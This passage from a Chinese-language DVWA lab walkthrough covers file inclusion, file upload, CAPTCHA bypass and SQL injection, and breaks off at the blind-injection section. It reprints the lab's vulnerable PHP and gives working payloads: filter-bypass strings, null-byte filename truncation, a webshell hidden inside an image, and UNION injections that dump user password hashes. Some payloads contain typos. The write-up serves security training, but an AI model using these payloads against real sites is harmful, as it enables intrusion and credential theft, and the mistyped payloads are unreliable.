![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324113044130.png)

修改测试文件为一句话木马，访问后用蚁剑连接-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324112614379.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324112800311.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

#### 2.远程文件包含

由于搭建的服务也是在本地所以直接使用IP访问，不过访问的ip根目录为phpstudy的网站根目录，所以测试文件要放在根目录（WWW）下面，创建测试文件-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021032411341982.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324113547538.png)

## Medium

### 源代码

    <?php
    
    // The page we wish to display
    $file = $_GET[ 'page' ];
    
    // Input validation
    $file = str_replace( array( "http://", "https://" ), "", $file );
    $file = str_replace( array( "../", "..\"" ), "", $file );
    
    ?> 
    
        

利用`str_replace`进行了过滤，我们可以双写进行绕过

#### 1.本地文件包含

双写绕过格式：…/./
#### 2.远程文件包含

双写绕过格式：hthttp://tp://

## High

### 源代码

    <?php
    
    // The page we wish to display
    $file = $_GET[ 'page' ];
    
    // Input validation
    if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
        // This isn't the page we want!
        echo "ERROR: File not found!";
        exit;
    }
    
    ?> 
    
        

`fnmatch(pattern,string,flags)`：根据指定的模式来匹配文件名或字符串 ，规定只能包含file开头的文件

#### 远程文件包含

file协议又只能打开本地文件，这里可以配合文件上传漏洞利用。上传一个内容为php的php文件或jpg照片，然后再利用file协议去包含上传文件。

# File Upload

一些web应用程序中允许上传图片，文本或者其他资源到指定的位置，文件上传漏洞就是利用这些可以上传的地方将恶意代码植入到服务器中

## Low

### 源代码

    <?php
    
    if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    
        // Can we move the file to the upload folder?
        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
            // No
            echo '<pre>Your image was not uploaded.</pre>';
        }
        else {
            // Yes!
            echo "<pre>{$target_path} succesfully uploaded!</pre>";
        }
    }
    
    ?> 
    
        

发现并没有任何过滤，编写一个一句话木马，上传后直接用蚁剑连接-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324092021993.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324092058879.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021032409221426.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)连接成功，拿到权限。

## Medium

### 源代码

    <?php
    
    if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    
        // File information
        $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
        $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
        $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
    
        // Is it an image?
        if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
            ( $uploaded_size < 100000 ) ) {
    
            // Can we move the file to the upload folder?
            if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
                // No
                echo '<pre>Your image was not uploaded.</pre>';
            }
            else {
                // Yes!
                echo "<pre>{$target_path} succesfully uploaded!</pre>";
            }
        }
        else {
            // Invalid file
            echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
        }
    }
    
    ?> 
    
        

    if( ( $uploaded_type == “image/jpeg” || $uploaded_type == “image/png” ) &&
    ( $uploaded_size < 100000 ) )
    
        

必须为jpeg或者png类型，并且大小要小于100000B（约为97.6KB）。

1.  上传允许的类型，抓包修改mime类型

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324092948731.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324093003544.png)-
上传成功后蚁剑连接得到权限。

2.  %00截断-
    将一句话木马所在文件名为1.php.png,上传抓包发送到Repeater-
    在php后加上%00并进行url编码-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324093614681.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)点go发现上传成功并为php文件
    
3.  00截断
    

文件命名为1.php .png,上传抓包发送到Repeater,在Hex中将这里20改成00。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324094325769.png)点击go，上传成功并且文件类型为php

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324094414901.png)

## High

### 源代码

    <?php
    
    if( isset( $_POST[ 'Upload' ] ) ) {
        // Where are we going to be writing to?
        $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
        $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
    
        // File information
        $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
        $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
        $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
        $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];
    
        // Is it an image?
        if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&
            ( $uploaded_size < 100000 ) &&
            getimagesize( $uploaded_tmp ) ) {
    
            // Can we move the file to the upload folder?
            if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
                // No
                echo '<pre>Your image was not uploaded.</pre>';
            }
            else {
                // Yes!
                echo "<pre>{$target_path} succesfully uploaded!</pre>";
            }
        }
        else {
            // Invalid file
            echo '<pre>Your image was not uploaded. We can only accept JPEG or PNG images.</pre>';
        }
    }
    
    ?> 
    
        

限制了上传文件的后缀，只能上传后缀为".jpg"，“.jpeg” ，“.png”。同时限制了上传文件的文件头必须为图像类型。

##### 文件上传加文件包含

首先利用copy将一句话木马与图片进行合成

    copy 0.png/b+1.php/a 2.png
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326154525876.png)一句话木马已经被写在图片最后-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F202103261545437.png)-
图片上传后，用文件包含的方法，访问图片-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326154737250.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
用蚁剑进行连接,直接将网址复制下来-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326155318821.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326155413595.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
直接连接连接不上，需要保存cookie，两种方法

1.  上传文件时抓包

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326155518878.png)

2.  蚁剑中先保存，浏览网站-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326155619801.png)-
    浏览网站，登录，high等级submit，保存-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326155814612.png)-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326155908491.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
    还是连接不上，这里删除掉

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326155937939.png)-
只留下high等级，测试连接，保存。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210326155956220.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

#  Insecure CAPTCHA

## Low

### 源代码

     <?php
    
    if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
        // Hide the CAPTCHA form
        $hide_form = true;
    
        // Get input
        $pass_new  = $_POST[ 'password_new' ];
        $pass_conf = $_POST[ 'password_conf' ];
    
        // Check CAPTCHA from 3rd party
        $resp = recaptcha_check_answer(
            $_DVWA[ 'recaptcha_private_key'],
            $_POST['g-recaptcha-response']
        );
    
        // Did the CAPTCHA fail?
        if( !$resp ) {
            // What happens when the CAPTCHA was entered incorrectly
            $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
            $hide_form = false;
            return;
        }
        else {
            // CAPTCHA was correct. Do both new passwords match?
            if( $pass_new == $pass_conf ) {
                // Show next stage for the user
                echo "
                    <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                    <form action=\"#\" method=\"POST\">
                        <input type=\"hidden\" name=\"step\" value=\"2\" />
                        <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                        <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                        <input type=\"submit\" name=\"Change\" value=\"Change\" />
                    </form>";
            }
            else {
                // Both new passwords do not match.
                $html     .= "<pre>Both passwords must match.</pre>";
                $hide_form = false;
            }
        }
    }
    
    if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
        // Hide the CAPTCHA form
        $hide_form = true;
    
        // Get input
        $pass_new  = $_POST[ 'password_new' ];
        $pass_conf = $_POST[ 'password_conf' ];
    
        // Check to see if both password match
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );
    
            // Update database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
            // Feedback for the end user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with the passwords matching
            echo "<pre>Passwords did not match.</pre>";
            $hide_form = false;
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    ?>
    
    
    
        

这里主要验证`if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) )`，所以抓包修改它对应的信息即可-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327175851504.png)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327175900251.png)

## Medium

### 源代码

    <?php
    
    if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
        // Hide the CAPTCHA form
        $hide_form = true;
    
        // Get input
        $pass_new  = $_POST[ 'password_new' ];
        $pass_conf = $_POST[ 'password_conf' ];
    
        // Check CAPTCHA from 3rd party
        $resp = recaptcha_check_answer(
            $_DVWA[ 'recaptcha_private_key' ],
            $_POST['g-recaptcha-response']
        );
    
        // Did the CAPTCHA fail?
        if( !$resp ) {
            // What happens when the CAPTCHA was entered incorrectly
            $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
            $hide_form = false;
            return;
        }
        else {
            // CAPTCHA was correct. Do both new passwords match?
            if( $pass_new == $pass_conf ) {
                // Show next stage for the user
                echo "
                    <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                    <form action=\"#\" method=\"POST\">
                        <input type=\"hidden\" name=\"step\" value=\"2\" />
                        <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                        <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                        <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
                        <input type=\"submit\" name=\"Change\" value=\"Change\" />
                    </form>";
            }
            else {
                // Both new passwords do not match.
                $html     .= "<pre>Both passwords must match.</pre>";
                $hide_form = false;
            }
        }
    }
    
    if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
        // Hide the CAPTCHA form
        $hide_form = true;
    
        // Get input
        $pass_new  = $_POST[ 'password_new' ];
        $pass_conf = $_POST[ 'password_conf' ];
    
        // Check to see if they did stage 1
        if( !$_POST[ 'passed_captcha' ] ) {
            $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
            $hide_form = false;
            return;
        }
    
        // Check to see if both password match
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );
    
            // Update database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
            // Feedback for the end user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with the passwords matching
            echo "<pre>Passwords did not match.</pre>";
            $hide_form = false;
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    ?> 
    
        

相比Low，Medium多了对passed\_captcha的检查，若值等于true就能绕过

     if( !$_POST[ 'passed_captcha' ] ) {
            $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
            $hide_form = false;
            return;
        }
    
        

修改step并且加上`&pass_captcha=ture`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327185312546.png)

Forward后-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327185546653.png)

## High

### 源代码

    <?php
    
    if( isset( $_POST[ 'Change' ] ) ) {
        // Hide the CAPTCHA form
        $hide_form = true;
    
        // Get input
        $pass_new  = $_POST[ 'password_new' ];
        $pass_conf = $_POST[ 'password_conf' ];
    
        // Check CAPTCHA from 3rd party
        $resp = recaptcha_check_answer(
            $_DVWA[ 'recaptcha_private_key' ],
            $_POST['g-recaptcha-response']
        );
    
        if (
            $resp || 
            (
                $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
                && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
            )
        ){
            // CAPTCHA was correct. Do both new passwords match?
            if ($pass_new == $pass_conf) {
                $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
                $pass_new = md5( $pass_new );
    
                // Update database
                $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "' LIMIT 1;";
                $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
                // Feedback for user
                echo "<pre>Password Changed.</pre>";
    
            } else {
                // Ops. Password mismatch
                $html     .= "<pre>Both passwords must match.</pre>";
                $hide_form = false;
            }
    
        } else {
            // What happens when the CAPTCHA was entered incorrectly
            $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
            $hide_form = false;
            return;
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    // Generate Anti-CSRF token
    generateSessionToken();
    
    ?> 
    
        

在网上查了许多教程，好像大家的High难度有两种版本，源代码与做题方法都略有差异，大家查一查也能发现另一个版本。

      $resp = recaptcha_check_answer(
            $_DVWA[ 'recaptcha_private_key' ],
            $_POST['g-recaptcha-response']
        );
    
        if (
            $resp || 
            (
                $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
                && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
            )
        )
    
        

满足其中一条即可修改密码。这里只需要添加`g-recaptcha-response=hidd3n_valu3`并且更改`HTTP_USER_AGENT:reCAPTCHA`即可，所以修改密码，抓包。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327191149236.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
Forward后-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327191226975.png)

# SQL Injection

## Low

### 查看源代码

    <?php
    
    if( isset( $_REQUEST[ 'Submit' ] ) ) {
        // Get input
        $id = $_REQUEST[ 'id' ];
    
        // Check database
        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        // Get results
        while( $row = mysqli_fetch_assoc( $result ) ) {
            // Get values
            $first = $row["first_name"];
            $last  = $row["last_name"];
    
            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    
        mysqli_close($GLOBALS["___mysqli_ston"]);
    }
    
    ?> 
    
        

没有任何过滤

#### 1.判断是否存在注入点

尝试万能公式`1' or 1=1 #`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317085407654.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

#### 2\. 判断为字符型注入,猜字段数

    1' oder by 1 #
    1' oder by 2 #
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317085702711.png%23pic_center)

    1' oder by 3 #
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317085640665.png%23pic_center)则字段数为3

#### 3.联合注入爆库

    1' union select 1,database()#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317090318121.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)则当前使用的数据库为dvwa

#### 4.接下来便是爆表，爆列，爆内容

爆表：`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317090628196.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)爆列：`1' union select 1,group_concat(column_name) from information_schema.columns where table_name ='users'#`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317090709945.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)爆列中的内容：`1' union select1,concat(user,password) from users#`

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317090811245.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)

## Medium
### 源代码

     <?php
    
    if( isset( $_POST[ 'Submit' ] ) ) {
        // Get input
        $id = $_POST[ 'id' ];
    
        $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
    
        $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
    
        // Get results
        while( $row = mysqli_fetch_assoc( $result ) ) {
            // Display values
            $first = $row["first_name"];
            $last  = $row["last_name"];
    
            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    
    }
    
    // This is used later on in the index.php page
    // Setting it here so we can close the database connection in here like in the rest of the source scripts
    $query  = "SELECT COUNT(*) FROM users;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    $number_of_rows = mysqli_fetch_row( $result )[0];
    
    mysqli_close($GLOBALS["___mysqli_ston"]);
    ?>
    
    
        

这里`$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);` 会转义sql中的一些特殊字符如：\\x00 \\n \\r \\ ’ " \\x1a 。并且Medium无输入框，但可以用burpsuite抓包来爆信息

#### 1.判断是否存在注入，注入是字符型还是数字型

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021031709504660.png%23pic_center)尝试`1‘ or 1=1#` 出现错误，尝试`1 or 1=1#`查询成功，则存在数字型注入。

##### 2\. 猜字段数

这里仍然只有两个字段![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317095620645.png%23pic_center)

#### 3.爆库

    1 union select 1,database()#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021031709580482.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)

#### 4.爆表，爆列，爆信息

这里如果仍然使用Low中爆表的方法，则会报错，因为 ’单引号被转义-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317100047154.png)由于对’单引号转义，所以用16进制进行绕过，dvwa的16进制为0x64767761

    1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761() #
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317101101931.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
爆列：user的16进制为0x75736572

    1 union select 1, group_concat(column_name) from information_schema.columns where table_name=0x75736572#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317101408853.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)-
爆内容：

    1 union select 1,concat(user,password) from users#
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317101654242.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%23pic_center)

## High

### 查看源代码

    <?php
    
    if( isset( $_SESSION [ 'id' ] ) ) {
        // Get input
        $id = $_SESSION[ 'id' ];
    
        // Check database
        $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
        $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
    
        // Get results
        while( $row = mysqli_fetch_assoc( $result ) ) {
            // Get values
            $first = $row["first_name"];
            $last  = $row["last_name"];
    
            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
    }
    ?> 
    
        

相比Low，这里添加了`LIMIT 1`，即每次只输出一个结果，但我们用#还是能注释掉，剩余步骤与Low相同。

    		~~如果输入了两条语句，就会这样~~ 
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210317103807664.png%23pic_center)

* * *

## SQL Injection(Blind)

## Low

### 查看源代码

    <?php
    
